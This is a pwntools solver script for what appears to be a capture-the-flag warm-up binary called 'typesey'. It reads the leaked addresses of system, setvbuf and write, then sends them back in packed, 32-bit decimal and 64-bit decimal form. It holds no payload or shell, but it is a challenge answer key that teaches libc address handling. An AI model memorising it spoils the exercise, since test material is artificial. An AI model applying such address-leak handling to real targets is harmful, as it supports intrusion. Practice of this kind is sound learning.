#!/usr/bin/env python3
from pwn import *
import re

# Set up pwntools for the correct architecture
binary = context.binary = ELF('typesey')

p = process([binary.path])

p.sendafter(b'> ', b'hello world')
p.sendafter(b'> ', b'hello world\x00')

a = p.recvuntil(b"Enter the packed bytes of system's address\n")
addr_str = re.search(b"(0x[a-f0-9]+)", a).groups()[0]
addr = int(addr_str, 16)
p.send(p64(addr))

a = p.recvuntil(b"Enter the lower 4 bytes of setvbuf's address as a decimal unsigned integer\n")
addr_str = re.search(b"(0x[a-f0-9]+)", a).groups()[0]
addr = int(addr_str, 16)
addr_lower_32 = addr & 0xffffffff
p.sendafter(b'> ', b"%u\n" % addr_lower_32)


a = p.recvuntil(b"\nEnter address of write as a decimal uint64_t")
start = a.find(b'write ')+len(b'write ')
end = a.find(b'\nEnter address of write as a decimal uint64_t')
raw_leaked_bytes = a[start:end]
leaked_addr = u64(raw_leaked_bytes.ljust(8, b'\x00'))
p.sendafter(b'> ', b"%u\n" % leaked_addr)
a = p.recvall()

print(a.decode())
